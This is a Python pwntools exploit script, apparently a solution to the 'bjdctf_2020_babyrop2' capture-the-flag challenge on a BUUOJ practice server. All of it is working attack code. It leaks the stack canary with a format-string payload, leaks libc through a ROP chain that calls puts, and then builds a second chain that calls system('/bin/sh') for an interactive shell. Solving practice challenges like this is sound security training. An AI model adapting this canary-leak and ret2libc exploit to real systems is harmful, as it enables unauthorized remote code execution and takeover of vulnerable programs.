#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./bjdctf_2020_babyrop2")
	elf = ELF("./bjdctf_2020_babyrop2")
else:
	p = remote("node3.buuoj.cn",26857)
	elf = ELF("./bjdctf_2020_babyrop2")

vuln = 0x400814
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi_ret = 0x0000000000400993

###leak canary###
payload = 'ab%7$p'
sla("I'll give u some gift to help u!",payload)
ru("ab")
canary = int(rv(18),16)
success(hex(canary))

###leak libc###
offset = 0x20
payload = 'A' * (offset-0x8) + p64(canary) +'deadbeef' 
payload+= p64(pop_rdi_ret) + p64(puts_got)
payload+= p64(puts_plt) + p64(vuln)
sla("Pull up your sword and tell me u story!",payload)

puts = u64(ru("\x7f")[-6:].ljust(8,'\x00'))
libc = LibcSearcher("puts",puts)
libc_base = puts - libc.dump('puts')

system = libc_base + libc.dump("system")
sh = libc_base + libc.dump("str_bin_sh")

###ROP###
sla("I'll give u some gift to help u!","hack it")

payload = 'A' * (offset-0x8) + p64(canary) +'deadbeef' 
payload+= p64(pop_rdi_ret) + p64(sh)
payload+= p64(system) + p64(vuln)
sla("Pull up your sword and tell me u story!",payload)

###get shell###
ia()
